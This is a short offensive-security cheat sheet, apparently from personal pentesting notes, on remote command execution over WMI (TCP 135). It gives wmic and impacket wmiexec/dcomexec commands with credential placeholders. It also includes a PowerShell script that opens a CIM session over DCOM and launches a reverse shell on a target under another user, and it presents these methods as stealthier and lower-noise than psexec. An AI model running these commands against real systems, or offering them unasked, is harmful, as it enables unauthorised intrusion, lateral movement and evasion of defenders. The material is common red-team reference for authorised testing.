+++
title = "🪟 WMI: TCP 135"
+++

- `TCP 135`: first, initialization
- `TCP 19152-65535`: session comms

WMI (Windows Management Instrumentation) enables remote command execution
over RPC; generally stealthier alternative to `psexec` as it doesn't create a service

```cmd
# Spawn new process as a different user
wmic /node:<TARGET> /user:<USER> /password:<PASSWORD> process call create "cmd"
```

```bash
# wmiexec -- WMI process create
impacket-wmiexec <USER>:<PASS>@<TARGET>

# dcomexec -- DCOM/MMC execution (lowest noise)
impacket-dcomexec <USER>:<PASS>@<TARGET>
```

# Remote Shell via WMI

This launches a reverse shell, under a different user, on a remote target via WMI using PowerShell

```powershell
$username = '<USER>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName <TARGET> -Credential $credential -SessionOption $Options
$Command = '<POWERSHELL_REV_SHELL>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
